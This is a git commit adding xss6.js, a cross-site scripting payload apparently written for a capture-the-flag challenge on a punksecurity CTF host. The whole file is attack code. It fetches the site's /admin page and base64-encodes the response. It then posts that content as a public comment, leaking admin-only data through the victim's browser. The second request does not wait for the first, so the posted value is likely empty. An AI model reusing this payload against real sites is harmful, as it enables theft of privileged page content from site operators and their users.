70d421e3831c0ad9df3e20d172ceddca1aa2f829
303sec <39656643+303sec@users.noreply.github.com>
2023-05-04 17:39:09 +0100

    Create xss6.js

---
+++ xss6.js
@@ -0,0 +1,32 @@
+var output = "";
+fetch("http://blog.9f626c1e-d05.ctf.one.dr.punksecurity.cloud:5000/admin", {
+    "headers": {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "cache-control": "no-cache",
+        "pragma": "no-cache",
+    },
+    "referrer": "http://blog.9f626c1e-d05.ctf.one.dr.punksecurity.cloud:5000/",
+    "referrerPolicy": "strict-origin-when-cross-origin",
+    "body": null,
+    "method": "GET",
+    "mode": "cors",
+    "credentials": "omit"
+}).then(response => response.text()).then(data => output = btoa(data));
+
+
+fetch("http://blog.9f626c1e-d05.ctf.one.dr.punksecurity.cloud:5000/new-comment", {
+    "headers": {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept-language": "en-US,en;q=0.9",
+        "cache-control": "max-age=0",
+        "content-type": "application/x-www-form-urlencoded",
+        "upgrade-insecure-requests": "1"
+    },
+    "referrer": "http://blog.9f626c1e-d05.ctf.one.dr.punksecurity.cloud:5000/",
+    "referrerPolicy": "strict-origin-when-cross-origin",
+    "body": `name=admin_page&comment=${encodeURIComponent(output)}`,
+    "method": "POST",
+    "mode": "cors",
+    "credentials": "omit"
+});
